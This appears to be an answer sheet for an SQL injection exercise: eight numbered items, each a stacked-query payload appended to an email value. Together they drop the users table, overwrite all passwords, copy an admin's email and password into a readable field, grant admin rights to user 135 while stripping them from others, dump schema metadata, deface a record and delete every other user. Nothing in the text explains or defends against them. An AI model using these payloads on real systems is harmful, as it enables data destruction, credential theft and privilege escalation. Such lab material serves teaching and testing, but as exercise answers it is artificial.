-- QUESTION 1

random@email.com;DROP TABLE users;

-- QUESTION 2

random@email.com;UPDATE users SET password = "mypass";

-- QUESTION 3

random@email.com;UPDATE users SET first_name = (SELECT concat(email , password) FROM user WHERE is_admin = 1) WHERE id = 135;

-- QUESTION 4

random@email.com;UPDATE user SET is_admin = 1 WHERE id = 135;

-- QUESTION 5

random@email.com;UPDATE user SET is_admin = 0 WHERE is_admin = 1;UPDATE user SET is_admin = 1 WHERE id = 135;

-- QUESTION 6

random@email.com;UPDATE users SET first_name = (SELECT * FROM INFORMATION_SCHEMA.COLUMNS) WHERE id = 135;

-- QUESTION 7

random@email.com;UPDATE users SET first_name = 'You have been hacked!' WHERE id = 1;

-- QUESTION 8

random@email.com;DELETE FROM users WHERE NOT id = 135;